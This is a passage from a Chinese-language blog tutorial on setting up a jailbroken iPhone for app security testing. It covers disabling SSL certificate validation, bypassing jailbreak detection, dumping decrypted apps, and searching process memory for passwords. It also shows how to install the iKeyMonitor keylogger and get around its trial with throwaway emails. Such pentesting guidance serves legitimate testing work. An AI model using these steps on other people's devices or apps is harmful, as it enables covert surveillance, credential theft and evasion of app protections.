<li>使用SSH连接iPhone，运行<code>wget &lt;RELEASE URL FROM STEP 2&gt;</code> -&gt; <code>dpkg -i &lt;DOWNLOAD PACKAGE NAME&gt;</code> -&gt;killall -HUP SpringBoard，确定安装成功后<code>rm &lt;DOWNLOAD PACKAGE NAME&gt;</code></li>
<li>打开iPhone，在设置 -&gt; SSL Kill Switch 2（设置的最下方） -&gt; 勾选Disable Certificate Validation</li>
</ol>
<img src="/2020/03/31/iOS-jailbreak/SSL-Kill-Switch.png" alt="SSL-Kill-Switch" style="zoom:33%;">



<h1 id="绕过越狱检测"><a href="#绕过越狱检测" class="headerlink" title="绕过越狱检测"></a>绕过越狱检测</h1><h3 id="Liberty"><a href="#Liberty" class="headerlink" title="Liberty"></a>Liberty</h3><p>iPhone上打开Cydia，添加源<code>https://ryleyangus.com/repo/</code>，之后搜索<code>Liberty Lite</code>，安装即可。</p>
<p>安装完成之后在设置中开启Liberty，再点击Block Jailbreak Detection中选择需要绕过越狱检测的iOS应用。</p>
<img src="/2020/03/31/iOS-jailbreak/liberty.png" alt="liberty" style="zoom:33%;">

<p>如果在某些APP中不生效，也可以尝试其他插件，比如xCon。</p>
<h3 id="xCon"><a href="#xCon" class="headerlink" title="xCon"></a>xCon</h3><p>在Cydia中添加源 <a href="http://xcon.crazy.net/" target="_blank" rel="noopener">http://xcon.crazy.net</a> ，进入添加的源中选择xCon下载安装即可。</p>
<p>xCon会绕过以下越狱检测方法（1）根据是否存在特定的越狱文件，及特定文件的权限是否发生变化来判断设备是否越狱（2）根据沙箱完整性检测设备是否越狱（3）根据文件系统的分区是否发生变化来检测设备是否越狱（4）根据是否安装ssh来判断设备是否越狱</p>
<h1 id="导出APP文件"><a href="#导出APP文件" class="headerlink" title="导出APP文件"></a>导出APP文件</h1><p>导出APP是一个非常有用的功能，导出之后的文件没有壳，拖到IDA中直接反编译就行，非常方便，谁用谁知道。</p>
<ol>
<li>在Mac中输入<code>git clone https://github.com/AloneMonkey/frida-ios-dump.git &amp;&amp; cd frida-ios-dump</code></li>
<li><code>sudo pip3 install -r requirements.txt --upgrade</code></li>
<li>在另一个终端输入<code>iproxy 2222 22</code></li>
<li><code>python3 dump.py -l</code>列举iPhone上所有的应用，<code>python3 ./dump.py &lt;APP DISPLAY NAME OR BUNDLE IDENTIFIER&gt;</code>导出APP文件。</li>
</ol>
<h1 id="安装Apple-File-Conduit-2"><a href="#安装Apple-File-Conduit-2" class="headerlink" title="安装Apple File Conduit 2"></a>安装Apple File Conduit 2</h1><p>iOS9以上无法通过第三方软件读取应用文件，安装Apple File Confuit2可绕过该限制。</p>
<p>在Cydia中搜索“Apple File Confuit2”即可</p>
<p>APP文件目录：    </p>
<p>a) iOS7及之前：/Device/private/var/mobile/Application/UUID/XXXXX.app/</p>
<p>b) iOS8：/var/mobile/Containers/Bundle/Application/UUID/</p>
<p>c) iOS9/10/12：/var/containers/Bundle/Application/UUID/</p>
<h1 id="添加mem-check"><a href="#添加mem-check" class="headerlink" title="添加mem-check"></a>添加mem-check</h1><p>已经安装好OpenSSH，可以使用sftp将mem-check文件上传到iPhone中。</p>
<p>在本机输入<code>sftp -P 2222 root@localhost</code>，再输入密码<code>alpine</code>进入sftp模式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ sftp -P 2222 root@localhost</span><br><span class="line">root@localhost<span class="string">'s password: alpine</span></span><br><span class="line"><span class="string">Connected to localhost.</span></span><br></pre></td></tr></table></figure>

<p>进入sftp模式后，使用put将文件上传至iPhone中，上传文件路径为本机的路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sftp&gt; put /Tmp/mem-check</span><br><span class="line">Uploading /Tmp/mem-check to /private/var/root/mem-check</span><br><span class="line">/Tmp/mem-check                                       100%  132KB   8.2MB/s   00:00</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>

<p>然后给mem-check加上执行权限，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x mem-check</span><br></pre></td></tr></table></figure>

<p>先用ps命令得到APP的PID，再利用mem-check –p PID –s STRING对APP内存进行搜索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ root<span class="comment"># ps A | grep XXX</span></span><br><span class="line">~ root<span class="comment"># mem-check -p 1234 -s password</span></span><br></pre></td></tr></table></figure>



<h1 id="iKeyMonitor安装"><a href="#iKeyMonitor安装" class="headerlink" title="iKeyMonitor安装"></a>iKeyMonitor安装</h1><p>iKeyMonitor安装直接在Cydia中搜索iKeyMonitor即可</p>
<p>iKeymonitor只有三天试用时间，使用十分钟邮箱（<a href="http://mail.bccto.me/" target="_blank" rel="noopener">http://mail.bccto.me/</a> ）获取一个随机的邮箱，然后在官网进行注册（ <a href="https://ikeymonitor.com/" target="_blank" rel="noopener">https://ikeymonitor.com/</a> ）</p>
<p>官网选择sign up -&gt; iPhone/iPad -&gt; The iPhone/iPad can be Jailbroken, and I can get it in my hand and jailbreak it -&gt; 填写User ID 和 Email</p>
<p>然后会收到一封邮件，点击查看可得到许可证号，使用许可证登录即可</p>
<p><img src="/2020/03/31/iOS-jailbreak/iKeyMonitor.png" alt="iKeyMonitor"></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13" target="_blank" rel="noopener">https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13</a></p>
<p><a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
<p><a href="https://github.com/sensepost/objection/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Screenshots</a></p>
]]></content>
  </entry>
</search>
